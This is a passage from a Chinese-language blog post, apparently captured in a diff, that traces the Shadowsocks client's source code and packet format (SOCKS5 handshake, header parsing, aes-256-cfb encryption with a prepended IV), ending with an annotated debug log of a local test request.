class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">parse_header</span><span class="params">(data)</span>:</span></span><br><span class="line">    addrtype = ord(data[<span class="number">0</span>])</span><br><span class="line">    dest_addr = <span class="literal">None</span></span><br><span class="line">    dest_port = <span class="literal">None</span></span><br><span class="line">    header_length = <span class="number">0</span></span><br><span class="line">    <span class="keyword">if</span> addrtype == ADDRTYPE_IPV4:</span><br><span class="line">        <span class="keyword">if</span> len(data) &gt;= <span class="number">7</span>:</span><br><span class="line">            dest_addr = socket.inet_ntoa(data[<span class="number">1</span>:<span class="number">5</span>])</span><br><span class="line">            dest_port = struct.unpack(<span class="string">'&gt;H'</span>, data[<span class="number">5</span>:<span class="number">7</span>])[<span class="number">0</span>]</span><br><span class="line">            header_length = <span class="number">7</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            logging.warn(<span class="string">'header is too short'</span>)</span><br><span class="line">    <span class="keyword">elif</span> addrtype == ADDRTYPE_HOST:</span><br><span class="line">        <span class="keyword">if</span> len(data) &gt; <span class="number">2</span>:</span><br><span class="line">            addrlen = ord(data[<span class="number">1</span>])</span><br><span class="line">            <span class="keyword">if</span> len(data) &gt;= <span class="number">2</span> + addrlen:</span><br><span class="line">                dest_addr = data[<span class="number">2</span>:<span class="number">2</span> + addrlen]</span><br><span class="line">                dest_port = struct.unpack(<span class="string">'&gt;H'</span>, data[<span class="number">2</span> + addrlen:<span class="number">4</span> +</span><br><span class="line">                                                     addrlen])[<span class="number">0</span>]</span><br><span class="line">                header_length = <span class="number">4</span> + addrlen</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                logging.warn(<span class="string">'header is too short'</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            logging.warn(<span class="string">'header is too short'</span>)</span><br><span class="line">    <span class="keyword">elif</span> addrtype == ADDRTYPE_IPV6:</span><br><span class="line">        <span class="keyword">if</span> len(data) &gt;= <span class="number">19</span>:</span><br><span class="line">            dest_addr = socket.inet_ntop(socket.AF_INET6, data[<span class="number">1</span>:<span class="number">17</span>])</span><br><span class="line">            dest_port = struct.unpack(<span class="string">'&gt;H'</span>, data[<span class="number">17</span>:<span class="number">19</span>])[<span class="number">0</span>]</span><br><span class="line">            header_length = <span class="number">19</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            logging.warn(<span class="string">'header is too short'</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        logging.warn(<span class="string">'unsupported addrtype %d, maybe wrong password or '</span></span><br><span class="line">                     <span class="string">'encryption method'</span> % addrtype)</span><br><span class="line">    <span class="keyword">if</span> dest_addr <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">    <span class="keyword">return</span> addrtype, to_bytes(dest_addr), dest_port, header_length</span><br></pre></td></tr></table></figure>
+
+<p>之后进入 is_local分支</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> self._is_local:</span><br><span class="line">               <span class="comment"># forward address to remote</span></span><br><span class="line">               self._write_to_sock((<span class="string">b'\x05\x00\x00\x01'</span></span><br><span class="line">                                    <span class="string">b'\x00\x00\x00\x00\x10\x10'</span>),</span><br><span class="line">                                   self._local_sock)</span><br><span class="line">               data_to_send = self._encryptor.encrypt(data)</span><br><span class="line">               self._data_to_write_to_remote.append(data_to_send)</span><br><span class="line">               <span class="comment"># notice here may go into _handle_dns_resolved directly</span></span><br><span class="line">               self._dns_resolver.resolve(self._chosen_server[<span class="number">0</span>],</span><br><span class="line">                                          self._handle_dns_resolved)</span><br></pre></td></tr></table></figure>
+
+<p>于是就知道为什么根据数据包里捕获到客户端的回复中，绑定的ip和端口是0.0.0.0:4112了，原来这里直接写死了，并没有根据实际情况进行返回。（这里也许可以改进一下）</p>
+<p>（这里之所以要把地址信息（也就是data）加密后放进  self._data_to_write_to_remote.append(data_to_send)，其实就已经在开始封装接下来要发送的消息了）</p>
+<p>然后应该要和服务端进行连接了，看到_dns_resolver.resolve</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">resolve</span><span class="params">(self, hostname, callback)</span>:</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> type(hostname) != bytes:</span><br><span class="line">            hostname = hostname.encode(<span class="string">'utf8'</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> hostname:</span><br><span class="line">            callback(<span class="literal">None</span>, Exception(<span class="string">'empty hostname'</span>))</span><br><span class="line">        <span class="keyword">elif</span> common.is_ip(hostname):</span><br><span class="line">            <span class="comment"># logging.info(hostname)</span></span><br><span class="line">            callback((hostname, hostname), <span class="literal">None</span>)</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
+
+<p>这里我们的hostname是ip，所以执行回调函数，也就是 _handle_dns_resolved，比较核心的就是</p>
+<figure class="highlight lasso"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">remote_sock.connect((remote_addr, remote_port))</span><br><span class="line"><span class="params">...</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">self</span>._loop.add(remote_sock,eventloop.POLL_ERR | eventloop.POLL_OUT,<span class="built_in">self</span>._server)</span><br><span class="line"><span class="built_in">self</span>._stage = STAGE_CONNECTING</span><br><span class="line"><span class="params">...</span></span><br></pre></td></tr></table></figure>
+
+<p>那么loop里有一个新的连接了。正常来说下一步应该是接受用户的数据，然后加密，然后发送给服务端了。此时TCPRelayHandler会再次进入 self._on_local_read()，</p>
+<figure class="highlight lasso"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">elif <span class="built_in">self</span>._stage == STAGE_CONNECTING:</span><br><span class="line">    <span class="built_in">self</span>._handle_stage_connecting(<span class="built_in">data</span>)</span><br></pre></td></tr></table></figure>
+
+<p>接收到信息后 根据 _stage 进入  _handle_stage_connecting</p>
+<figure class="highlight lasso"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">def _handle_stage_connecting(<span class="built_in">self</span>, <span class="built_in">data</span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">self</span>._is_local:</span><br><span class="line">        <span class="built_in">data</span> = <span class="built_in">self</span>._encryptor.encrypt(<span class="built_in">data</span>)</span><br><span class="line">    <span class="built_in">self</span>._data_to_write_to_remote.append(<span class="built_in">data</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">self</span>._is_local <span class="literal">and</span> <span class="literal">not</span> <span class="built_in">self</span>._fastopen_connected <span class="literal">and</span> \</span><br><span class="line">            <span class="built_in">self</span>._config<span class="meta">[</span><span class="string">'fast_open'</span><span class="meta">]</span>:</span><br></pre></td></tr></table></figure>
+
+<p>那么由于这里还是满足 _is_local（表示这是客户端），所以信息会先加密，但由于config并没有配置 fast_open，所以直接返回了，根据调试发现，随后loop里有了一个新的event，值是4，也就是表示eventloop.POLL_OUT，于是进入方法 _on_remote_write()</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">_on_remote_write</span><span class="params">(self)</span>:</span></span><br><span class="line">    <span class="comment"># handle remote writable event</span></span><br><span class="line">    self._stage = STAGE_STREAM</span><br><span class="line">    <span class="keyword">if</span> self._data_to_write_to_remote:</span><br><span class="line">        data = <span class="string">b''</span>.join(self._data_to_write_to_remote)</span><br><span class="line">        self._data_to_write_to_remote = []</span><br><span class="line">        self._write_to_sock(data, self._remote_sock)</span><br></pre></td></tr></table></figure>
+
+<p>改变了 self._stage = STAGE_STREAM，然后将 _data_to_write_to_remote 数组里面的值全部发送给了服务端</p>
+<p>此时，_data_to_write_to_remote 里的值为 encrypt(ATYPE+IP+PORT+DATA)</p>
+<p>我们简单看一下加密方法，首先会载入配置文件设定的密码和加密方法，</p>
+<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">self</span>._encryptor = encrypt.Encryptor(config[<span class="string">'password'</span>],</span><br><span class="line">                                            config[<span class="string">'method'</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment"># encrypt.py </span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encrypt</span><span class="params">(<span class="keyword">self</span>, buf)</span></span><span class="symbol">:</span></span><br><span class="line">        <span class="keyword">if</span> len(buf) == <span class="number">0</span><span class="symbol">:</span></span><br><span class="line">            <span class="keyword">return</span> buf</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">self</span>.<span class="symbol">iv_sent:</span></span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">self</span>.cipher.update(buf)</span><br><span class="line">        <span class="symbol">else:</span></span><br><span class="line">            <span class="keyword">self</span>.iv_sent = True</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">self</span>.cipher_iv + <span class="keyword">self</span>.cipher.update(buf)</span><br></pre></td></tr></table></figure>
+
+<p>那么这里就是将消息按照指定的方法进行加密，然后拼接上iv，将数据返回。于是最终用户向客户端发送的数据，在客户端发送给服务端时则封装为</p>
+<p><strong>iv+encrypt(atype|ip|port|data)</strong></p>
+<p>其中，由于我们选择的是默认的aes-256-cfb方法，加密后不会填充，于是封装后的消息长度等于 16+7 + len(data)，这就与我们之前抓到的数据包的长度变化吻合了。</p>
+<p>然后就是服务端的接收、向目标网站发送请求、对客户端进行回复，</p>
+<p>收到服务端的消息后我们进入分支</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> sock == self._remote_sock:</span><br><span class="line">        ...</span><br><span class="line">        <span class="keyword">if</span> event &amp; (eventloop.POLL_IN | eventloop.POLL_HUP):</span><br><span class="line">            logging.info(<span class="string">"read from remote"</span>)</span><br><span class="line">            self._on_remote_read()</span><br><span class="line">            </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">_on_remote_read</span><span class="params">(self)</span>:</span></span><br><span class="line">    data = self._remote_sock.recv(BUF_SIZE)</span><br><span class="line">	...</span><br><span class="line">    <span class="keyword">if</span> self._is_local:</span><br><span class="line">        data = self._encryptor.decrypt(data)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        self._write_to_sock(data, self._local_sock)</span><br></pre></td></tr></table></figure>
+
+<p>那么客户端会先将消息解密，随后发送给用户。</p>
+<p>至此，我们对客户端这里的处理逻辑分析清楚了。</p>
+<ol>
+<li>首先用户向客户端发起第一次socket握手</li>
+<li>客户端进行第一次回复</li>
+<li>用户向客户端发送目的地址的相关信息</li>
+<li>客户端保存相关信息并加密，放入待发送消息队列；和服务端建立连接；然后对用户进行第二次回复</li>
+<li>用户向客户端发送对目的地址的相关请求</li>
+<li>客户端对消息进行加密，放入待发送消息队列，然后将整个消息队列发送给服务端</li>
+</ol>
+<p>下面是笔者在审计代码时加入的一些额外的注释，可以更方便的看清整个流程</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">INFO: loading config from config.json</span><br><span class="line">2023-01-12 17:03:02 WARNING  warning: server <span class="keyword">set</span> <span class="keyword">to</span> listen <span class="keyword">on</span> <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">8388</span>, <span class="keyword">are</span> you sure?</span><br><span class="line"><span class="number">2023</span><span class="number">-01</span><span class="number">-12</span> <span class="number">17</span>:<span class="number">03</span>:<span class="number">02</span> <span class="keyword">WARNING</span>  <span class="keyword">warning</span>: your <span class="keyword">timeout</span> <span class="number">60</span> seems too <span class="keyword">short</span></span><br><span class="line"><span class="number">2023</span><span class="number">-01</span><span class="number">-12</span> <span class="number">17</span>:<span class="number">03</span>:<span class="number">02</span> INFO     loading libcrypto <span class="keyword">from</span> C:\Windows\System32\libcrypto.dll</span><br><span class="line"><span class="number">2023</span><span class="number">-01</span><span class="number">-12</span> <span class="number">17</span>:<span class="number">03</span>:<span class="number">02</span> INFO     <span class="keyword">starting</span> <span class="keyword">local</span> <span class="keyword">at</span> <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">1081</span></span><br><span class="line"><span class="number">2023</span><span class="number">-01</span><span class="number">-12</span> <span class="number">17</span>:<span class="number">03</span>:<span class="number">02</span> DEBUG    server_socket &lt;socket.socket fd=<span class="number">536</span>, family=AddressFamily.AF_INET, <span class="keyword">type</span>=SocketKind.SOCK_STREAM, proto=<span class="number">6</span>, laddr=(<span class="string">'127.0.0.1'</span>, <span class="number">1081</span>)&gt;</span><br><span class="line"><span class="number">2023</span><span class="number">-01</span><span class="number">-12</span> <span class="number">17</span>:<span class="number">03</span>:<span class="number">02</span> DEBUG    <span class="keyword">using</span> <span class="keyword">event</span> <span class="keyword">model</span>: <span class="keyword">select</span></span><br><span class="line"><span class="number">2023</span><span class="number">-01</span><span class="number">-12</span> <span class="number">17</span>:<span class="number">03</span>:<span class="number">04</span> DEBUG    <span class="keyword">LOOP</span>: this <span class="built_in">time</span> ,sock: &lt;socket.socket fd=<span class="number">536</span>, family=AddressFamily.AF_INET, <span class="keyword">type</span>=SocketKind.SOCK_STREAM, proto=<span class="number">6</span>, laddr=(<span class="string">'127.0.0.1'</span>, <span class="number">1081</span>)&gt;,fd: <span class="number">536</span>, <span class="keyword">event</span>: <span class="number">1</span></span><br><span class="line"><span class="number">2023</span><span class="number">-01</span><span class="number">-12</span> <span class="number">17</span>:<span class="number">03</span>:<span class="number">04</span> DEBUG    <span class="keyword">accept</span></span><br><span class="line"><span class="number">2023</span><span class="number">-01</span><span class="number">-12</span> <span class="number">17</span>:<span class="number">03</span>:<span class="number">04</span> DEBUG    chosen <span class="keyword">server</span>: <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">8388</span></span><br><span class="line"><span class="number">2023</span><span class="number">-01</span><span class="number">-12</span> <span class="number">17</span>:<span class="number">03</span>:<span class="number">04</span> DEBUG    <span class="keyword">LOOP</span>: this <span class="built_in">time</span> ,sock: &lt;socket.socket fd=<span class="number">356</span>, family=AddressFamily.AF_INET, <span class="keyword">type</span>=SocketKind.SOCK_STREAM, proto=<span class="number">0</span>, laddr=(<span class="string">'127.0.0.1'</span>, <span class="number">1081</span>), raddr=(<span class="string">'127.0.0.1'</span>, <span class="number">64393</span>)&gt;,fd: <span class="number">356</span>, <span class="keyword">event</span>: <span class="number">1</span></span><br><span class="line"><span class="number">2023</span><span class="number">-01</span><span class="number">-12</span> <span class="number">17</span>:<span class="number">03</span>:<span class="number">04</span> DEBUG    &lt;socket.socket fd=<span class="number">356</span>, family=AddressFamily.AF_INET, <span class="keyword">type</span>=SocketKind.SOCK_STREAM, proto=<span class="number">0</span>, laddr=(<span class="string">'127.0.0.1'</span>, <span class="number">1081</span>), raddr=(<span class="string">'127.0.0.1'</span>, <span class="number">64393</span>)&gt;</span><br><span class="line"><span class="number">2023</span><span class="number">-01</span><span class="number">-12</span> <span class="number">17</span>:<span class="number">03</span>:<span class="number">04</span> DEBUG    <span class="keyword">read</span> <span class="keyword">from</span> <span class="keyword">local</span></span><br><span class="line"><span class="number">2023</span><span class="number">-01</span><span class="number">-12</span> <span class="number">17</span>:<span class="number">03</span>:<span class="number">04</span> DEBUG    <span class="keyword">read</span> <span class="keyword">local</span> <span class="keyword">data</span>: b<span class="string">'\x05\x01\x00'</span></span><br><span class="line"><span class="number">2023</span><span class="number">-01</span><span class="number">-12</span> <span class="number">17</span>:<span class="number">03</span>:<span class="number">04</span> DEBUG    writing <span class="keyword">data</span> <span class="keyword">to</span> sock &lt;socket.socket fd=<span class="number">356</span>, family=AddressFamily.AF_INET, <span class="keyword">type</span>=SocketKind.SOCK_STREAM, proto=<span class="number">0</span>, laddr=(<span class="string">'127.0.0.1'</span>, <span class="number">1081</span>), raddr=(<span class="string">'127.0.0.1'</span>, <span class="number">64393</span>)&gt; b<span class="string">'\x05\x00'</span></span><br><span class="line"><span class="number">2023</span><span class="number">-01</span><span class="number">-12</span> <span class="number">17</span>:<span class="number">03</span>:<span class="number">04</span> DEBUG    <span class="keyword">LOOP</span>: this <span class="built_in">time</span> ,sock: &lt;socket.socket fd=<span class="number">356</span>, family=AddressFamily.AF_INET, <span class="keyword">type</span>=SocketKind.SOCK_STREAM, proto=<span class="number">0</span>, laddr=(<span class="string">'127.0.0.1'</span>, <span class="number">1081</span>), raddr=(<span class="string">'127.0.0.1'</span>, <span class="number">64393</span>)&gt;,fd: <span class="number">356</span>, <span class="keyword">event</span>: <span class="number">1</span></span><br><span class="line"><span class="number">2023</span><span class="number">-01</span><span class="number">-12</span> <span class="number">17</span>:<span class="number">03</span>:<span class="number">04</span> DEBUG    &lt;socket.socket fd=<span class="number">356</span>, family=AddressFamily.AF_INET, <span class="keyword">type</span>=SocketKind.SOCK_STREAM, proto=<span class="number">0</span>, laddr=(<span class="string">'127.0.0.1'</span>, <span class="number">1081</span>), raddr=(<span class="string">'127.0.0.1'</span>, <span class="number">64393</span>)&gt;</span><br><span class="line"><span class="number">2023</span><span class="number">-01</span><span class="number">-12</span> <span class="number">17</span>:<span class="number">03</span>:<span class="number">04</span> DEBUG    <span class="keyword">read</span> <span class="keyword">from</span> <span class="keyword">local</span></span><br><span class="line"><span class="number">2023</span><span class="number">-01</span><span class="number">-12</span> <span class="number">17</span>:<span class="number">03</span>:<span class="number">04</span> DEBUG    <span class="keyword">read</span> <span class="keyword">local</span> <span class="keyword">data</span>: b<span class="string">'\x05\x01\x00\x011\xebu\xef\x1f@'</span></span><br><span class="line"><span class="number">2023</span><span class="number">-01</span><span class="number">-12</span> <span class="number">17</span>:<span class="number">03</span>:<span class="number">04</span> INFO     connecting <span class="number">49.235</span><span class="number">.117</span><span class="number">.239</span>:<span class="number">8000</span> <span class="keyword">from</span> <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">64393</span></span><br><span class="line"><span class="number">2023</span><span class="number">-01</span><span class="number">-12</span> <span class="number">17</span>:<span class="number">03</span>:<span class="number">04</span> DEBUG    writing <span class="keyword">data</span> <span class="keyword">to</span> sock &lt;socket.socket fd=<span class="number">356</span>, family=AddressFamily.AF_INET, <span class="keyword">type</span>=SocketKind.SOCK_STREAM, proto=<span class="number">0</span>, laddr=(<span class="string">'127.0.0.1'</span>, <span class="number">1081</span>), raddr=(<span class="string">'127.0.0.1'</span>, <span class="number">64393</span>)&gt; b<span class="string">'\x05\x00\x00\x01\x00\x00\x00\x00\x10\x10'</span></span><br><span class="line"><span class="number">2023</span><span class="number">-01</span><span class="number">-12</span> <span class="number">17</span>:<span class="number">03</span>:<span class="number">04</span> DEBUG    <span class="keyword">LOOP</span>: this <span class="built_in">time</span> ,sock: &lt;socket.socket fd=<span class="number">356</span>, family=AddressFamily.AF_INET, <span class="keyword">type</span>=SocketKind.SOCK_STREAM, proto=<span class="number">0</span>, laddr=(<span class="string">'127.0.0.1'</span>, <span class="number">1081</span>), raddr=(<span class="string">'127.0.0.1'</span>, <span class="number">64393</span>)&gt;,fd: <span class="number">356</span>, <span class="keyword">event</span>: <span class="number">1</span></span><br><span class="line"><span class="number">2023</span><span class="number">-01</span><span class="number">-12</span> <span class="number">17</span>:<span class="number">03</span>:<span class="number">04</span> DEBUG    &lt;socket.socket fd=<span class="number">356</span>, family=AddressFamily.AF_INET, <span class="keyword">type</span>=SocketKind.SOCK_STREAM, proto=<span class="number">0</span>, laddr=(<span class="string">'127.0.0.1'</span>, <span class="number">1081</span>), raddr=(<span class="string">'127.0.0.1'</span>, <span class="number">64393</span>)&gt;</span><br><span class="line"><span class="number">2023</span><span class="number">-01</span><span class="number">-12</span> <span class="number">17</span>:<span class="number">03</span>:<span class="number">04</span> DEBUG    <span class="keyword">read</span> <span class="keyword">from</span> <span class="keyword">local</span></span><br><span class="line"><span class="number">2023</span><span class="number">-01</span><span class="number">-12</span> <span class="number">17</span>:<span class="number">03</span>:<span class="number">04</span> DEBUG    <span class="keyword">read</span> <span class="keyword">local</span> <span class="keyword">data</span>: b<span class="string">'GET /flag.txt HTTP/1.1\r\nHost: 49.235.117.239:8000\r\nUser-Agent: python-requests/2.26.0\r\nAccept-Encoding: gzip, deflate\r\nAccept: */*\r\nConnection: keep-alive\r\n\r\n'</span></span><br><span class="line"><span class="number">2023</span><span class="number">-01</span><span class="number">-12</span> <span class="number">17</span>:<span class="number">03</span>:<span class="number">04</span> DEBUG    <span class="keyword">LOOP</span>: this <span class="built_in">time</span> ,sock: &lt;socket.socket fd=<span class="number">300</span>, family=AddressFamily.AF_INET, <span class="keyword">type</span>=SocketKind.SOCK_STREAM, proto=<span class="number">6</span>, laddr=(<span class="string">'127.0.0.1'</span>, <span class="number">64394</span>), raddr=(<span class="string">'127.0.0.1'</span>, <span class="number">8388</span>)&gt;,fd: <span class="number">300</span>, <span class="keyword">event</span>: <span class="number">4</span></span><br><span class="line"><span class="number">2023</span><span class="number">-01</span><span class="number">-12</span> <span class="number">17</span>:<span class="number">03</span>:<span class="number">04</span> DEBUG    &lt;socket.socket fd=<span class="number">300</span>, family=AddressFamily.AF_INET, <span class="keyword">type</span>=SocketKind.SOCK_STREAM, proto=<span class="number">6</span>, laddr=(<span class="string">'127.0.0.1'</span>, <span class="number">64394</span>), raddr=(<span class="string">'127.0.0.1'</span>, <span class="number">8388</span>)&gt;</span><br><span class="line"><span class="number">2023</span><span class="number">-01</span><span class="number">-12</span> <span class="number">17</span>:<span class="number">03</span>:<span class="number">04</span> DEBUG    writing <span class="keyword">to</span> remote</span><br><span class="line"><span class="number">2023</span><span class="number">-01</span><span class="number">-12</span> <span class="number">17</span>:<span class="number">03</span>:<span class="number">04</span> DEBUG    writing <span class="keyword">data</span> <span class="keyword">to</span> sock &lt;socket.socket fd=<span class="number">300</span>, family=AddressFamily.AF_INET, <span class="keyword">type</span>=SocketKind.SOCK_STREAM, proto=<span class="number">6</span>, laddr=(<span class="string">'127.0.0.1'</span>, <span class="number">64394</span>), raddr=(<span class="string">'127.0.0.1'</span>, <span class="number">8388</span>)&gt; b<span class="string">'\xb1\x98\xfe\x97\xcdv\x1d\xec-\xcb\xe4\xc7P\x86\xdf\x15~\xaa\xf7\x9cc\x19\xd2R\xb3!\xaf\xd3\x86q\xf1L`\x1c\x81;d\xa5%\x19\xd9\xa4\xe7\xb0\x04M\x9d\xbc\xc7\xf8\xcchH\x8c\xce\xec\xf2\xb8H7\xaa\xcdY\xa6\xccq\x99\xac\x1f9h\xdd\x08O\xad\r\xf3\xedH\x94\xf7\x1f\x94\xa1\x04\xfc\xda!9\x1f\xde\x88\xb0s%\xca\xdb\xc93\xac\x92N\x12 #\xbaw\x89Wt\x1d[\xf8\x88O&#123;\x99Mg\xe5\xe8M\x88\x82!\xae\xff\xb3p\xe8_\x01\x7f\x91U=\tJ\x937\xb2\x9d\x02D\x0f\x03Y\xb5 \xa5M7\xc6Jkmf|\xf3\\\x16H\xd0&#123;\xf9\x91\xfa9\xcd\x87\xb3\x98\xafX\x0f\xefcy\xdb\x12\xbe'</span></span><br><span class="line"><span class="number">2023</span><span class="number">-01</span><span class="number">-12</span> <span class="number">17</span>:<span class="number">03</span>:<span class="number">04</span> DEBUG    <span class="keyword">LOOP</span>: this <span class="built_in">time</span> ,sock: &lt;socket.socket fd=<span class="number">300</span>, family=AddressFamily.AF_INET, <span class="keyword">type</span>=SocketKind.SOCK_STREAM, proto=<span class="number">6</span>, laddr=(<span class="string">'127.0.0.1'</span>, <span class="number">64394</span>), raddr=(<span class="string">'127.0.0.1'</span>, <span class="number">8388</span>)&gt;,fd: <span class="number">300</span>, <span class="keyword">event</span>: <span class="number">1</span></span><br><span class="line"><span class="number">2023</span><span class="number">-01</span><span class="number">-12</span> <span class="number">17</span>:<span class="number">03</span>:<span class="number">04</span> DEBUG    &lt;socket.socket fd=<span class="number">300</span>, family=AddressFamily.AF_INET, <span class="keyword">type</span>=SocketKind.SOCK_STREAM, proto=<span class="number">6</span>, laddr=(<span class="string">'127.0.0.1'</span>, <span class="number">64394</span>), raddr=(<span class="string">'127.0.0.1'</span>, <span class="number">8388</span>)&gt;</span><br><span class="line"><span class="number">2023</span><span class="number">-01</span><span class="number">-12</span> <span class="number">17</span>:<span class="number">03</span>:<span class="number">04</span> DEBUG    <span class="keyword">read</span> <span class="keyword">from</span> remote</span><br><span class="line"><span class="number">2023</span><span class="number">-01</span><span class="number">-12</span> <span class="number">17</span>:<span class="number">03</span>:<span class="number">04</span> DEBUG    debug <span class="keyword">read</span> <span class="keyword">from</span> remote</span><br><span class="line"><span class="number">2023</span><span class="number">-01</span><span class="number">-12</span> <span class="number">17</span>:<span class="number">03</span>:<span class="number">04</span> DEBUG    writing <span class="keyword">data</span> <span class="keyword">to</span> sock &lt;socket.socket fd=<span class="number">356</span>, family=AddressFamily.AF_INET, <span class="keyword">type</span>=SocketKind.SOCK_STREAM, proto=<span class="number">0</span>, laddr=(<span class="string">'127.0.0.1'</span>, <span class="number">1081</span>), raddr=(<span class="string">'127.0.0.1'</span>, <span class="number">64393</span>)&gt; b<span class="string">'HTTP/1.0 200 OK\r\nServer: SimpleHTTP/0.6 Python/3.6.8\r\nDate: Thu, 12 Jan 2023 09:03:04 GMT\r\nContent-type: text/plain\r\nContent-Length: 18\r\nLast-Modified: Wed, 04 Jan 2023 08:53:15 GMT\r\n\r\nflag&#123;you_got_it!&#125;\n'</span></span><br><span class="line"><span class="number">2023</span><span class="number">-01</span><span class="number">-12</span> <span class="number">17</span>:<span class="number">03</span>:<span class="number">04</span> DEBUG    <span class="keyword">LOOP</span>: this <span class="built_in">time</span> ,sock: &lt;socket.socket fd=<span class="number">300</span>, family=AddressFamily.AF_INET, <span class="keyword">type</span>=SocketKind.SOCK_STREAM, proto=<span class="number">6</span>, laddr=(<span class="string">'127.0.0.1'</span>, <span class="number">64394</span>), raddr=(<span class="string">'127.0.0.1'</span>, <span class="number">8388</span>)&gt;,fd: <span class="number">300</span>, <span class="keyword">event</span>: <span class="number">1</span></span><br><span class="line"><span class="number">2023</span><span class="number">-01</span><span class="number">-12</span> <span class="number">17</span>:<span class="number">03</span>:<span class="number">04</span> DEBUG    &lt;socket.socket fd=<span class="number">300</span>, family=AddressFamily.AF_INET, <span class="keyword">type</span>=SocketKind.SOCK_STREAM, proto=<span class="number">6</span>, laddr=(<span class="string">'127.0.0.1'</span>, <span class="number">64394</span>), raddr=(<span class="string">'127.0.0.1'</span>, <span class="number">8388</span>)&gt;</span><br><span class="line"><span class="number">2023</span><span class="number">-01</span><span class="number">-12</span> <span class="number">17</span>:<span class="number">03</span>:<span class="number">04</span> DEBUG    <span class="keyword">read</span> <span class="keyword">from</span> remote</span><br><span class="line"><span class="number">2023</span><span class="number">-01</span><span class="number">-12</span> <span class="number">17</span>:<span class="number">03</span>:<span class="number">04</span> DEBUG    debug <span class="keyword">read</span> <span class="keyword">from</span> remote</span><br><span class="line"><span class="number">2023</span><span class="number">-01</span><span class="number">-12</span> <span class="number">17</span>:<span class="number">03</span>:<span class="number">04</span> DEBUG    destroy: <span class="number">49.235</span><span class="number">.117</span><span class="number">.239</span>:<span class="number">8000</span></span><br><span class="line"><span class="number">2023</span><span class="number">-01</span><span class="number">-12</span> <span class="number">17</span>:<span class="number">03</span>:<span class="number">04</span> 